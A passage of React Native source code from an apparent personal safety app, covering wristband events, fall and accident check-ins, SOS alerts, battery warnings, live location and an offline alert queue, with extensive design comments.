                  + (ev?.ff_ms ? ` Free-fall lasted ${ev.ff_ms}ms.` : '')).trim();
    const clientId = pressId();

    // On screen immediately, before the network call, for the same reason
    // `raise` dispatches before its POST: the wearer must see the countdown
    // and get their chance to cancel even with no signal at all. The deadline
    // shown here is provisional and is replaced by the server's below.
    const localWindow = INCIDENT_WINDOW_S[reason] ?? 45;
    dispatch('FALL_DETECTED', {
      severity: reason === 'accident' ? 5 : 4,
      reason,
      note,
      window: localWindow,
      endsAt: Date.now() + localWindow * 1000,
    });
    noteImpact();
    Vibration.vibrate([0, 400, 200, 400, 200, 400]);

    // The band asks the question on the wrist, which is the only channel that
    // reaches somebody face down on a pavement with the phone across the road.
    // It nags on its own from here -- see CHECKIN_NAG_MS in the .ino.
    try { bandRef.current?.send?.({ c: 'checkin_req', window: localWindow }); } catch { /* no band */ }

    try {
      const r = await call(session, '/checkin/self', {
        method: 'POST',
        body: { reason, lat: at?.lat, lon: at?.lon, note, client_id: clientId },
        timeout: ALERT_TIMEOUT,
      });
      // The wearer already answered this one -- from the wrist, while the
      // first attempt was timing out in a dead zone. Take the countdown off
      // the screen rather than starting one for a question that is closed.
      if (r.already_answered) { dispatch('FALL_CANCELLED'); return; }

      // The server's deadline replaces the local guess. It is authoritative --
      // the sweeper is going to act on THAT number, so a countdown showing a
      // different one is lying to the person deciding whether to press.
      dispatch('FALL_DETECTED', {
        severity: reason === 'accident' ? 5 : 4,
        reason, note, checkinId: r.checkin_id,
        window: r.window ?? localWindow, endsAt: r.due_at * 1000,
      });
    } catch {
      // No network. The countdown above stands, and running out will raise the
      // alert into the offline queue rather than into the sweeper. Said plainly
      // on screen, because the two are not equally reliable and the wearer is
      // the one who may need to make a phone call instead.
      setToast('No signal — if you do not answer, the alert will send as soon as '
               + 'connection returns');
    }
  }, [session, fix, dispatch]);

  // ---- the band drives the same actions ----------------------------------
  const ctxRef = useRef(ctx);
  ctxRef.current = ctx;
  const stateRef = useRef(state);
  stateRef.current = state;

  const onBandEvent = useCallback((ev) => {
    // ---- a spike the band could not interpret -------------------------------
    //
    // Handled before bandEventToAction, and deliberately not by it: `impact` is
    // not a transition. It is a measurement, and whether it means anything at
    // all depends on the phone's speed history, which the reducer has no
    // business knowing about. The band sends these freely -- a hand put down
    // hard on a table clears 8 g -- and the speed gate is the entire reason
    // that is acceptable rather than a stream of false alarms.
    if (ev.e === 'impact') {
      if (classifyImpact(ev) !== 'accident') return;
      openIncidentCheckin('accident', ev);
      return;
    }

    const action = bandEventToAction(ev);
    if (!action) return;

    if (action.type === 'FALL_DETECTED') {
      if (stateRef.current === 'sos_live') return;      // already the worst case
      // A fall while travelling at road speed is an accident, whatever the
      // band called it. The free-fall the band saw is a rider leaving a bike,
      // and the family needs to be sent to a carriageway rather than told
      // somebody tripped.
      const reason = speedContext().wasTravelling ? 'accident' : 'fall';
      openIncidentCheckin(reason, ev);
      return;
    }

    if (action.type === 'SOS_RAISED') {
      if (!ctxRef.current.activeSos) {
        raise({ kind: ev.e === 'snatch' ? 'snatch' : 'sos', source: 'band', note: ev.src || '' });
      } else {
        // Pressed again during an emergency that is already live. Nothing new
        // is raised -- one press, one alert -- but the band is sitting there
        // waiting to be told what happened to this press, and silence is not an
        // answer. Without this it would run out its 4 s and buzz FAILED at
        // somebody whose SOS is in fact live and being answered, which is the
        // worst possible time to tell them help is not coming.
        reportOutcome('delivered', 'sos');
      }
      return;
    }

    if (action.type === 'CHECKIN_CLOSED') {
      // Key 1 is "I'm fine": it stands down a live alert, otherwise it answers
      // the open question. Start and stop from the band, with no firmware change.
      const live = ctxRef.current.activeSos;
      if (live) { resolve(live.id); return; }
      // A fall or an accident is a question too, and it is the one this key
      // matters most for: the wearer is on the ground with the phone somewhere
      // else, and the wrist is the only thing in reach. Routed to cancelFall
      // rather than to ackCheckin so the "nobody was told" note is written and
      // the countdown actually comes off the screen.
      if (stateRef.current === 'fall_pending') { cancelFallRef.current?.(); return; }
      ackCheckin(ctxRef.current.checkin);
      return;
    }

    if (action.type === 'CHECKIN_EXPIRED') {
      // The band gave up nagging. The server is the one escalating, so all
      // this does is stop the wearer wondering: the buzzing stopped, and
      // nothing on screen would otherwise say why.
      dispatch('CHECKIN_EXPIRED');
      setToast('The check-in window has passed — your family is being told. '
               + 'Answering now still tells them you are fine.');
      return;
    }

    if (action.type === 'HIGH_ALERT_SET') {
      // The band's hold-3s is only the switch; the mode itself is server-owned
      // so that it outlives this app being killed.
      toggleHighAlert(action.on);
    }
  }, [dispatch, raise, resolve, ackCheckin, toggleHighAlert, reportOutcome,
      openIncidentCheckin]);

  // ---- the band PIN, kept against the account ---------------------------
  //
  // `band.js` knows when a PIN has been ACCEPTED by the wristband, and knows
  // nothing about accounts. This is the seam: it turns that fact into a row on
  // the server, so a wearer who forgets the PIN can get it back.
  //
  // It exists because pressing Disconnect makes the phone forget the PIN, which
  // is deliberate and stays -- and which removes the local copy in precisely
  // the situation somebody wants it back.
  //
  // `escrowReachable` is the guard that keeps the two copies honest. A PIN
  // changed with no signal would leave the account holding the old one, and an
  // account confidently handing back a PIN the band has stopped accepting is
  // worse than an account holding none: the wearer types it, the band refuses,
  // and they have spent attempts against a lockout believing they had the
  // answer. So a change without a network is refused rather than allowed to
  // diverge.
  const sessionRef = useRef(session);
  sessionRef.current = session;

  const escrowPin = useCallback(async (pin) => {
    const s = sessionRef.current;
    if (!s) return false;
    try { await saveBandPin(s, pin); return true; } catch { return false; }
  }, []);

  const escrowReachable = useCallback(async () => {
    const s = sessionRef.current;
    if (!s) return false;
    // `/me` rather than the PIN endpoint: it is cheap, unlimited, and reading
    // the PIN is rate limited precisely so it cannot be used as a heartbeat.
    try { await call(s, '/me'); return true; } catch { return false; }
  }, []);

  const band = useBandLink(onBandEvent, { escrowPin, escrowReachable });
  bandRef.current = band;

  // Two separate things need this app's Android process alive, and the service
  // is the only thing that keeps it alive once the app is off screen or swiped
  // out of Recents. Either one on its own is enough to justify it:
  //
  //   1. A linked band. The GATT link belongs to the process, so when the
  //      process dies the band drops back to advertising -- the blinking light.
  //   2. Being armed at all. useHeartbeat only beats while mode != 'idle', and
  //      the server's watchdog pages the whole family with watch_lost after
  //      BEAT_LOST_S of silence in exactly that state. Kill the process of an
  //      armed phone and it reports its own wearer missing. That applies to
  //      virtual mode especially, where the phone *is* the band and there is no
  //      stored band id to find.
  //
  // Condition 2 is why this cannot simply ask "does this phone want a band".
  //
  // What must *not* be used is the live connection. A band out of range is
  // exactly when band.js's retry loop needs the process alive; stopping the
  // service there would kill the thing doing the reconnecting. band.status is
  // in the dependency list as a trigger only -- it changes at both moments the
  // stored flag does (connected when the id is written, idle when DISCONNECT
  // clears it), which re-runs the read without band.js having to know the
  // service exists at all.
  useEffect(() => {
    // Before the stored mode loads every launch looks like virtual mode -- the
    // same trap bandLink.js's autoLink had. Acting on that default would stop
    // the service for a moment on every launch of a band-wearer's phone.
    if (!band.modeLoaded) return undefined;

    let cancelled = false;
    (async () => {
      // Armed is decisive on its own and needs no storage read, so it is
      // answered first: there is no band state that makes it safe to let an
      // armed phone's process die.
      if (watchMode !== 'idle') { syncBackgroundWatch(!!session); return; }

      // Idle from here. Only a band the user still wants keeps the service up;
      // DISCONNECT clears that id, and virtual mode has none to begin with.
      if (band.mode !== MODES.BLE) { syncBackgroundWatch(false); return; }

      const wanted = await wantsBand();
      if (cancelled) return;
      // null means the read failed. Passed through so syncBackgroundWatch
      // leaves the service alone rather than tearing down a live link over it.
      syncBackgroundWatch(wanted === null ? null : (!!session && wanted));
    })();
    return () => { cancelled = true; };
  }, [session, band.status, band.mode, band.modeLoaded, watchMode]);

  // ---- the band's own way in: SWITCHED OFF --------------------------------
  //
  // Turned off on purpose on 1 Sep 2026. The full reasoning, and the exact
  // steps to turn it back on, are in docs/BAND_WAKE_DISABLED.md. Nothing was
  // deleted: the three effects that drove it are kept verbatim below this one,
  // commented out, and the module they call is switched off at
  // `BAND_WAKE_ENABLED` in src/bandWake.js and `BandWake.FEATURE_ENABLED` in
  // BandWake.kt.
  //
  // The short version: the wake carries no band identity, so one band's press
  // is accepted by every Nigraan phone in range (BUG-012) and swallows the
  // second wearer's own SOS on the way past (BUG-013). Both are Critical, both
  // need a band id in the advertisement, and that means new firmware in the
  // field before this can be trusted again. On the reporter's Android 8 Vivo
  // the wake also drags unrelated apps to the foreground (BUG-018).
  //
  // What is given up by switching it off, said plainly: on an OEM skin that
  // runs `kill -9` on a Recents swipe, a press with the app killed now reaches
  // nobody. The band is only a working safety device while this app or its
  // foreground service is alive.
  //
  // This effect is the one live remnant, and it is a cleanup rather than a
  // feature: a phone updating from a build that had the wake armed still has a
  // registration in the Bluetooth stack and an `armed` flag in the module's
  // storage that BandWakeBootReceiver would act on after the next reboot.
  // `stopBandWake()` clears both. It is cheap, idempotent and a no-op on a
  // phone that never had it.
  useEffect(() => { stopBandWake(); }, []);

  /* ---- SWITCHED OFF: the beacon path, kept for whoever turns it back on ----

  // The foreground service above is the app's attempt to stay alive. On most
  // non-Samsung skins it loses: a swipe on the Recents screen is `kill -9`, and
  // the GATT link dies with the process. From that moment the band looks linked
  // and can reach nobody, which is the exact state a wearer walks out in.
  //
  // So the SOS also goes out in the band's advertisement, and the scan that
  // matches it is registered with Android rather than held by us -- it outlives
  // the kill. See src/bandWake.js.
  //
  // Armed on the same standing instruction the link itself runs on, and
  // deliberately NOT on `session`: a signed-out phone still wants the press
  // written down, and the pending record waits for a session rather than being
  // thrown away. Not on `band.status` either -- an out-of-range band is when
  // this matters most, and disarming then would remove the one path still
  // capable of carrying the alert.
  useEffect(() => {
    if (!band.modeLoaded) return undefined;
    if (band.mode !== MODES.BLE) { stopBandWake(); return undefined; }

    let cancelled = false;
    (async () => {
      const wanted = await wantsBand();
      if (cancelled || wanted === null) return;   // read failed: change nothing
      if (wanted) await startBandWake(); else await stopBandWake();
    })();
    return () => { cancelled = true; };
  }, [band.mode, band.modeLoaded, band.status]);

  // What to do with a press that came in over the advertisement.
  //
  // It goes through `raise` like every other SOS: the same GPS fix, the same
  // offline queue, the same family fan-out. A second code path for the
  // emergency case would be the one nobody ever exercises.
  const raiseBeaconSos = useCallback(async (hit) => {
    if (!hit) return;
    // Too old to escalate on its own. The wearer is still told -- a press that
    // went nowhere is exactly what they need to know about -- but a family is
    // not paged about something that happened before lunch.
    if (hit.stale) {
      setToast('Your band called for help while the app was closed, too long ago '
             + 'to send now. Press SOS again if you still need help.');
      return;
    }
    await raise({
      kind: 'sos',
      source: 'band',
      note: 'band beacon — the app was not running',
    });
  }, [raise]);

  // Held in a ref, and the two effects below depend on the token rather than on
  // the handler.
  //
  // `raise` closes over `fix`, which is replaced on every GPS update. Depending
  // on the handler directly would therefore tear the subscription down and
  // rebuild it every few seconds, and a press landing in one of those gaps
  // would find no listener -- so it would fall through to the notification
  // route on a phone where the app was in fact wide awake. The ref keeps the
  // newest handler without moving the subscription.
  const beaconSosRef = useRef(raiseBeaconSos);
  beaconSosRef.current = raiseBeaconSos;

  // Arriving while JS is alive: no notification, the alert simply goes.
  useEffect(() => {
    if (!session?.token) return undefined;
    return subscribeBandSos((hit) => beaconSosRef.current?.(hit));
  }, [session?.token]);

  // Arriving while the app was dead. The press was written to storage by a
  // receiver in a process that no longer exists; this is the first moment
  // anything can act on it. Checked on every resume as well as at boot,
  // because Android may bring the app back without a fresh mount.
  useEffect(() => {
    if (!session?.token) return undefined;
    const check = async () => {
      const hit = await consumePendingBandSos();
      if (hit) beaconSosRef.current?.(hit);
    };
    check();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') check();
    });
    return () => sub.remove();
  }, [session?.token]);

  ---- end of the switched-off beacon path ---- */

  // ---- U3.4 battery: one alert per threshold crossing, per device --------
  //
  // Two cells, watched separately. They used to be one number: `band.battery`
  // was raised as `going_dark` and shown to the family as "phone about to
  // die", so in BLE mode a wearer at 4% band and 90% phone paged his family
  // about the wrong device -- and a wearer whose phone was genuinely dying
  // said nothing at all, because the phone's own battery was never read.
  //
  // The distinction is not cosmetic. A flat band means the safety device is
  // off the air while the phone can still be reached by push; a flat phone
  // means every path to the family is about to close, including that push.
  // Hence going_dark at severity 3 against band_battery at 1.
  const phoneBatt = usePhoneBattery();
  const battLatch = useRef({ phoneLow: false, phoneDark: false, bandLow: false });

  useEffect(() => {
    const level = phoneBatt;
    if (level == null) return;                 // unknown is not the same as empty
    const low = level <= BATT_LOW;
    const dark = level <= BATT_DARK;

    if (dark && !battLatch.current.phoneDark) {
      battLatch.current.phoneLow = true;
      battLatch.current.phoneDark = true;
      raise({ kind: 'going_dark', source: 'app', note: `phone ${Math.round(level)}%` });
      setToast('Phone battery critical — your family has been told where you were');
    } else if (low && !battLatch.current.phoneLow) {
      battLatch.current.phoneLow = true;
      raise({ kind: 'low_battery', source: 'app', note: `phone ${Math.round(level)}%` });
    } else if (level > BATT_LOW + BATT_REARM) {
      battLatch.current.phoneLow = false;
      battLatch.current.phoneDark = false;     // charged: arm it again
    }
    dispatch('BATTERY', { level, low, goingDark: dark });
  }, [phoneBatt, raise, dispatch]);

  // The band's own cell. Only in BLE mode: in virtual mode `band.battery` is
  // this same phone read through expo-battery, so raising it here would page
  // the family twice for one battery.
  //
  // Debounced over consecutive readings rather than latched on one, because
  // this number is known to alternate -- see BAND_LOW_STREAK above. A single
  // reading below the threshold means nothing here.
  const bandLowStreak = useRef(0);
  useEffect(() => {
    if (band.mode !== MODES.BLE) return;
    const level = band.battery;
    if (level == null) return;

    if (level <= BATT_LOW) {
      bandLowStreak.current += 1;
      if (bandLowStreak.current >= BAND_LOW_STREAK && !battLatch.current.bandLow) {
        battLatch.current.bandLow = true;
        raise({ kind: 'band_battery', source: 'app', note: `band ${Math.round(level)}%` });
      }
    } else {
      bandLowStreak.current = 0;
      if (level > BATT_LOW + BATT_REARM) {
        battLatch.current.bandLow = false;     // charged: arm it again
      }
    }
  }, [band.battery, band.mode, raise]);

  // The server's watchdog listens for silence, so the phone speaks while
  // anything is armed. N2's foreground service is what keeps this going once
  // Android backgrounds the app.
  useHeartbeat(session, {
    mode: watchMode,
    bandLink: band.status === 'connected' || band.status === 'virtual',
    // Never substituted for one another. In virtual mode there is no second
    // cell, so bandBatt is null rather than a copy of the phone's reading.
    bandBatt: band.mode === MODES.BLE ? band.battery : null,
    phoneBatt,
    virtual: band.mode !== MODES.BLE,
  });

  // Presence is what makes the Good Samaritan fan-out possible at all: it is
  // the only way the server can know who is close to somebody else's emergency.
  usePresence(session, fix);

  // The speed history that turns an 11 g spike into either "a door slammed" or
  // "a road accident". It has to already be running when the impact happens --
  // there is no asking afterwards how fast somebody was going -- which is why
  // this is a standing watch and not something the detector starts.
  //
  // It costs battery, so it is tied to the phone actually acting as a safety
  // device rather than merely being signed in. A family member watching from
  // across town has no impacts to classify, and their emergencies arrive by
  // push whether or not this is running.
  useSpeedWatch(!!session && (band.status === 'connected' || band.mode !== MODES.BLE));

  // ---- live socket --------------------------------------------------------
  const serverOnline = useLive(session, {
    alert: (m) => {
      const a = m.alert;
      if (a.severity >= TAKEOVER_FROM) setIncoming(a);

      if (a.severity >= SIREN_FROM) {
        // N3.3/N3.4. On a dev or production build this is a real full-screen
        // intent plus a looping siren, so a backgrounded app takes the lock
        // screen over instead of waiting to be noticed. It returns false in
        // Expo Go and on web, where the native module is not in the binary --
        // there the old notification is still the best available signal.
        presentAlarm(a).then((took) => {
          // Not `sendEmergencyAlarmNotification` directly. The same alert also
          // arrives as a visible push and as a silent push that wakes the
          // background task, and this path is the only one that used to post
          // without first looking at what was already on screen -- which is
          // exactly why one SOS showed up two and three times with the app
          // open, and behaved itself with the app killed.
          if (!took) sendEmergencyAlarmIfNothingShown(a);
        });
      } else {
        // No siren, but the takeover above is on screen and the shade gets a
        // line too, so the same event is still there after it is dismissed.
        // The heading is the app's own wording, not `watch_lost` with its
        // underscore taken out.
        notifyIfAway(
          `${a.user.name} — ${(TAKEOVER_TITLE[a.kind] || a.kind.replace(/_/g, ' ')).toLowerCase()}`,
          TAKEOVER_LEDE[a.kind] || 'Open Nigraan for details.');
        // A quiet double buzz. The siren covers severity 4 and up; without
        // this a severity-3 takeover appeared on a silent phone in a pocket.
        try { Vibration.vibrate([0, 250, 150, 250]); } catch { /* no motor */ }
      }
      bump();
    },
    resolved: (m) => {
      setIncoming((cur) => (cur && cur.id === m.alert_id ? null : cur));
      setSamaritan((cur) => (cur && cur.id === m.alert_id ? null : cur));
      // The end of an emergency is the other half of the one that took the
      // screen. A family member who was shown a siren and then a four-second
      // toast had no reliable way of learning it was over.
      // Two ways an alert ends now, and they are different facts about what a
      // person did. "She pressed the button" is somebody actively saying they
      // are fine; "she answered two check-ins" is the server concluding it on
      // her behalf from two taps five minutes apart. A family member deciding
      // whether to keep driving is entitled to know which one they have.
      const how = m.auto
        ? 'They answered two check-ins in a row, so Nigraan stood it down.'
        : 'They stood the alert down themselves.';
      pushNotice({
        icon: 'shield', tone: U.mint,
        title: `${m.user.name} is safe`,
        body: how,
      });
      notifyIfAway(`${m.user.name} is safe`, how);
      bump();
    },

    // Her position, while it is still moving.
    //
    // The takeover is the screen most likely to be open when this arrives --
    // somebody has just been sirened awake and is looking at "SEE WHERE THEY
    // ARE" -- and until this the button under that heading opened a map of
    // where they had BEEN, frozen at the moment the button was pressed. The
    // alert row is patched in place rather than refetched: the frame carries
    // everything the pin needs, and a network round trip during an emergency
    // is a round trip that can fail.
    live_location: (m) => {
      setIncoming((cur) => (cur && String(cur.id) === String(m.alert_id)
        ? { ...cur, live_lat: m.lat, live_lon: m.lon, live_at: m.at, maps: m.maps }
        : cur));
      // And the wearer's own live alert, when this frame is the echo of a fix
      // this phone sent. It is what lets her own SOS screen say "Live" only
      // while the server is actually receiving positions -- see the note on
      // the fan-out targets in services/alerts.py.
      dispatch('LIVE_FIX', { alertId: m.alert_id, lat: m.lat, lon: m.lon,
                             at: m.at, maps: m.maps });
      // The embedded page polls the server itself, so the map moves without
      // this. What it does not know about is the native Directions button
      // underneath it, which routes from `live_lat` -- and a stale one sends
      // somebody to where she was when they opened the screen.
      setLiveMap((cur) => (cur && String(cur.id) === String(m.alert_id)
        ? { ...cur, live_lat: m.lat, live_lon: m.lon, live_at: m.at, maps: m.maps }
        : cur));
      // The alert lists redraw from the server, which now carries the same
      // fields on the row. Throttled by `bump` being cheap rather than by a
      // timer: at ten seconds apart this is six renders a minute.
      bump();
    },

    samaritan_status_update: (m) => {
      dispatch('SAMARITAN_STATUS', {
        alertId: m.alert_id,
        samaritan_status: m.samaritan_status,
        decided_by: m.decided_by,
      });
      setIncoming((cur) => {
        if (!cur || cur.id !== m.alert_id) return cur;
        return {
          ...cur,
          samaritan_status: m.samaritan_status,
          samaritan_decided_by: m.decided_by,
        };
      });
      if (m.samaritan_status === 'allowed') {
        setToast(`Nearby Good Samaritans have been notified by ${m.decided_by?.name || 'family'}`);
      } else if (m.samaritan_status === 'denied') {
        setToast('Emergency set to Family Only');
      }
      bump();
    },
    ack: (m) => {

      // `m.at` is the server's clock. Falling back to arrival time is only for
      // a phone talking to a server older than this change.
      dispatch('RESPONDER', { by: m.by, at: m.at });
      // The single most important thing anybody who has pressed SOS is waiting
      // to hear, and it was a toast that cleared itself after four seconds.
      pushNotice({
        icon: 'user-check', tone: U.mint,
        title: `${m.by.name} is on the way`,
        body: m.samaritan
          ? 'They are nearby and can see your location.'
          : 'They answered your alert and can see your location.',
        // No buzz. The wearer may be hiding from whoever they pressed the
        // button about -- the same rule the server's own responder push obeys.
        quiet: true,
      });
    },
    checkin_req: (m) => {
      // A detector's question, not a person's. Two things make it different
      // and both matter: there is no `from` to name, and it belongs on the
      // full-screen countdown rather than in a bottom sheet somebody can
      // scroll past. `/checkin/self` sends this back to the phone that raised
      // it -- harmlessly, since FALL_DETECTED is a no-op once fall_pending --
      // and it is also how a SECOND device on the same account finds out.
      if (m.system && INCIDENT_WINDOW_S[m.reason] != null) {
        dispatch('FALL_DETECTED', {
          severity: m.reason === 'accident' ? 5 : 4,
          reason: m.reason, note: m.note || '', checkinId: m.checkin_id,
          window: m.window, endsAt: (m.due_at || 0) * 1000,
        });
        Vibration.vibrate([0, 400, 200, 400, 200, 400]);
        band.send({ c: 'checkin_req', window: m.window ?? 45 });
        return;
      }
      const checkin = {
        ...m.from, checkin_id: m.checkin_id, window: m.window || 90,
        due_at: m.due_at, _startAt: Date.now() / 1000,
      };
      dispatch('CHECKIN_ASKED', { checkin });
      setAskSheet(checkin);
      Vibration.vibrate([0, 200, 100, 200]);
      band.send({ c: 'checkin_req', window: m.window ?? 45 });
      notify(`${m.from.name} is checking on you`, 'Tap "I am fine" to answer.');
    },
    // The sweeper's own knock, on the server's schedule rather than anyone's
    // thumb. It looks the same to the wearer, which is the point.
    //
    // Two rhythms arrive here now and they mean opposite things. `high_alert`
    // is the standing arrangement: answer, and it continues. `sos` is asked
    // with the family already alerted and sirens already running, and
    // answering it is the way OUT -- twice in a row and the alert stands
    // itself down. `streak` is how far along that the wearer already is, sent
    // by the server so the screen can say "1 of 2" instead of making somebody
    // under pressure keep count.
    buzz_now: (m) => {
      const checkin = {
        name: null, system: true, reason: m.reason, checkin_id: m.checkin_id,
        window: m.window || 90, due_at: m.due_at, _startAt: Date.now() / 1000,
        streak: m.streak ?? null, streakNeeded: m.streak_needed ?? null,
      };
      dispatch('CHECKIN_ASKED', { checkin });
      if (m.next_buzz_at) dispatch('NEXT_BUZZ', { at: m.next_buzz_at });
      setAskSheet(checkin);
      Vibration.vibrate([0, 400, 200, 400]);
      band.send({ c: 'checkin_req', window: m.window ?? 90 });
      notify(m.reason === 'sos' ? 'Are you safe now?' : 'Nigraan is checking on you',
             m.reason === 'sos'
               ? 'Answer twice in a row and your SOS is stood down.'
               : 'Tap "I am fine" to answer.');
    },

    // An SOS the wearer never pressed.
    //
    // High Alert was armed, a check-in went unanswered, and the sweeper raised
    // a real emergency about it -- see ESCALATION in server/config.py. This is
    // the first this phone hears of it, and it is very often a false alarm: a
    // shower, a bus with no signal, a phone face-down on a desk. So the SOS
    // screen has to come up, because the one tap that fixes a false alarm is
    // on it, and the tracker has to start, because the one case where it is
    // not a false alarm is the case the whole product exists for.
    sos_started: (m) => {
      if (!m.alert) return;
      dispatch('SOS_RAISED', { alert: m.alert });
      setDeliveredTo(null);
      setDeliveryStatus('delivered');
      showOwnSosNotification(m.alert);
      if (m.tracking) startTracking(m.tracking).catch(() => { /* bg tick retries */ });
      // No siren from the wearer's own pocket. Same rule as every other
      // notification they get during an emergency: they may be hiding from
      // whoever this is about.
      Vibration.vibrate([0, 400, 200, 400, 200, 400]);
      pushNotice({
        icon: 'alert-octagon', tone: U.red,
        title: 'Your family has been alerted',
        body: 'You did not answer a check-in. If you are safe, stand it down.',
        quiet: true,
      });
    },

    // The emergency ended without the wearer touching a stand-down button.
    //
    // Deliberately not the family's `resolved` frame, which this app renders
    // as news about somebody else and would show a person a notice about
    // themselves. What this phone has to do is the part only it can: drop the
    // SOS screen, and take down the sticky "SOS is active" notification it
    // posted -- which is un-dismissable by design, so nothing else ever will.
    sos_cleared: (m) => {
      dispatch('SOS_CLEARED');
      dispatch('CHECKIN_CLOSED');   // same pair, same reason as in `resolve`
      setDeliveredTo(null);
      setDeliveryStatus(null);
      clearOwnSosNotification();
      trackAfterStandDown(m.alert_id, m.track_until, m.track_every_s)
        .catch(() => { /* the next fix re-learns the window from the server */ });
      pushNotice({
        icon: 'shield', tone: U.mint,
        title: 'Your SOS has been stood down',
        body: m.track_until
          ? 'You answered two check-ins. Your family can still see you get home.'
          : 'You answered two check-ins, so your family has been told you are safe.',
      });
      bump();
    },
    // The answer to a question this phone asked. Somebody pressed "check on
    // her" precisely because they were worried, and the reply used to be four
    // and a half seconds of small grey text above the tab bar.
    checkin_ack: (m) => {
      pushNotice({
        icon: 'check-circle', tone: U.mint,
        title: `${m.by.name} is fine`,
        body: 'They answered your check-in.',
      });
      // No local notification: the server sends this one as a real push now,
      // which is what reaches a phone that is not running the app at all.
      bump();
    },
    watch_updated: () => bump(),
    samaritan: (m) => {
      setSamaritan(m.alert);
      Vibration.vibrate([0, 300, 150, 300]);
      notify('Someone near you needs help',
             'A Nigraan emergency was raised close by. Open the app if you can go.');
    },
    samaritan_on_way: (m) => pushNotice({
      icon: 'navigation', tone: U.mint,
      title: `${m.by.name} is heading there`,
      body: 'A neighbour close by answered the alert.',
      quiet: true,
    }),
    invite: (m) => {
      // Deliberately NOT a BigNotice, which is what this used to be.
      //
      // Every other notice in that queue is news: a check-in was answered, an
      // alert stood down, something that is over by the time it is read and
      // whose only correct response is to know it. A request is the opposite
      // -- it is a question with two answers, and it stays true until one of
      // them is given. Taking the screen for it meant reading it, dismissing
      // it, and then going to find the sheet where it could actually be
      // answered: three steps, one of them teaching a family that a thing
      // filling the screen is a thing you swipe away. That habit is the last
      // one this app can afford, because the same shape carries a siren.
      //
      // It lives in the interface now instead, in the two places somebody
      // looks for family: the bell beside ADD on the user shell's board, and
      // the Family tab in the admin console -- both carrying a dot for as
      // long as the question is unanswered, which is the whole point. `bump`
      // is what makes both of them true, by reloading the invite list.
      //
      // The OS notification stays exactly as it was. It is the only half that
      // reaches a phone this app is not running on.
      notify(`${m.invite.from.name} wants to be your family`,
             'Nothing is shared until you accept.');
      bump();
    },
    family_added: (m) => { setToast(`${m.user.name} is now in your family`); bump(); },
  });

  // ---- offline queue: every chance to flush it ----------------------------
  //
  // The rising edge of the WebSocket was the only trigger, and it is the one
  // that cannot fire when it matters most: the socket lives in this tree, so a
  // phone whose app is off screen when signal returns reconnects nothing and
  // delivers nothing until somebody opens it. Four triggers now, because each
  // covers a case the others cannot:
  //
  //   1. the socket's rising edge   -- app open, signal returns
  //   2. coming back to the app     -- reopened after being backgrounded
  //   3. a timer while anything is queued -- app open but the socket is not
  //      the thing that came back (captive portal, server restarted)
  //   4. the foreground service's tick -- app closed entirely; see bgService
  //
  // Two of these firing together would send the same alert twice, and a family
  // paged twice for one press is how a real one gets ignored. There are two
  // guards against that now, at different depths: `flushing` below keeps this
  // screen from doing redundant work, the queue's own interlock covers the
  // background service that this ref cannot see, and `client_id` makes a
  // duplicate that gets through harmless at the server. The last one is the
  // only one that survives the app being killed mid-send.
  const flushing = useRef(false);
  const flushNow = useCallback(async () => {
    if (!session || flushing.current) return;
    flushing.current = true;
    try {
      const { delivered } = await flushQueue(session);
      if (delivered.length > 0) {
        const last = delivered[delivered.length - 1];
        const count = last.response?.delivered_to;
        // Replace the local placeholder with the real server alert.
        if (last.response?.alert) {
          dispatch('SOS_RAISED', { alert: last.response.alert });
        }
        // And start reporting, now that there is a row to report into. This is
        // the dead-zone SOS finally landing -- the emergency has been running
        // for however long the signal took, so the family's first live pin
        // matters more here than anywhere else: the fix in the alert is where
        // she was when she pressed it, which by now may be a long way behind.
        if (last.response?.tracking) {
          startTracking(last.response.tracking).catch(() => { /* bg tick retries */ });
        }
        setDeliveredTo(count ?? null);
        setDeliveryStatus('delivered');
        // The end of the worst wait in the product: an emergency that has been
        // sitting on the phone with no signal has finally gone out. That is
        // not a toast, and the SOS screen it belongs to may not even be the
        // one on top by the time the queue drains.
        pushNotice({
          icon: 'send', tone: U.mint,
          title: count
            ? `Delivered to ${count} ${count === 1 ? 'person' : 'people'}`
            : 'Your alert has been sent',
          body: 'It was saved while you had no signal, and has now gone out.',
        });
        bump();
        return;
      }
      // Nothing delivered here does not mean nothing was delivered. The
      // background flush may have emptied the queue while this screen was
      // gone, and a live SOS screen still reading "waiting for signal" after
      // the alert has actually gone out is the wrong kind of wrong.
      if ((await pendingCount()) === 0) {
        setDeliveryStatus((cur) => (cur === 'queued' ? 'delivered' : cur));
      }
    } finally {
      flushing.current = false;
    }
  }, [session, dispatch, bump, pushNotice]);

  const prevOnline = useRef(false);
  useEffect(() => {
    if (serverOnline && !prevOnline.current) flushNow();
    prevOnline.current = serverOnline;
  }, [serverOnline, flushNow]);

  // ---- a question the socket never delivered ------------------------------
  //
  // `buzz_now` and `checkin_req` arrive over the websocket, and a websocket is
  // not a delivery guarantee -- it is a delivery optimisation. The server
  // writes to whatever sockets happen to be open and drops the frame silently
  // when there are none, which on Android is most of the time: backgrounded,
  // killed by the OEM, or on a train.
  //
  // The check-in row exists either way and its deadline is real. Ninety
  // seconds later the sweeper escalates it and the family is told she did not
  // answer -- a page about a question that was never put to her, which is the
  // worst failure this screen has. There is now a push behind the socket frame
  // as well, but a push is not a guarantee either.
  //
  // So whenever this phone gets back in touch -- socket up, or app brought to
  // the foreground -- it asks the server outright whether it owes anybody an
  // answer, and shows the question with the deadline that is ACTUALLY left
  // rather than a fresh ninety seconds it has no right to.
  //
  // The same read repairs the other half of a killed process: the machine is
  // memory-only, so a restart forgets High Alert, `watchMode` falls back to
  // idle and the heartbeat stops -- while the server still has her armed and
  // pages the family for silence three minutes later. The server is the one
  // that owns that flag, so this takes its answer.
  const recoverOpenWork = useCallback(async () => {
    if (!session?.token) return;
    let w;
    try {
      w = await call(session, `/watch/${session.user_id}`);
    } catch {
      return;                       // still out of touch; the next trigger retries
    }

    if (w.high_alert && !ctxRef.current.highAlert) {
      dispatch('HIGH_ALERT_SET', { on: true, nextBuzzAt: w.next_buzz_at || null });
    }

    // Nothing open, or this is the question already on screen.
    if (!w.checkin_id) return;
    if (ctxRef.current.checkin?.checkin_id === w.checkin_id) return;

    const checkin = {
      checkin_id: w.checkin_id,
      due_at: w.checkin_due_at,
      // Only for the progress bar's denominator; the countdown itself runs to
      // `due_at`, which is the server's clock and the only one that escalates.
      window: 90,
      reason: w.checkin_reason,
      system: !w.checkin_from,
      ...(w.checkin_from || {}),
      _startAt: Date.now() / 1000,
    };
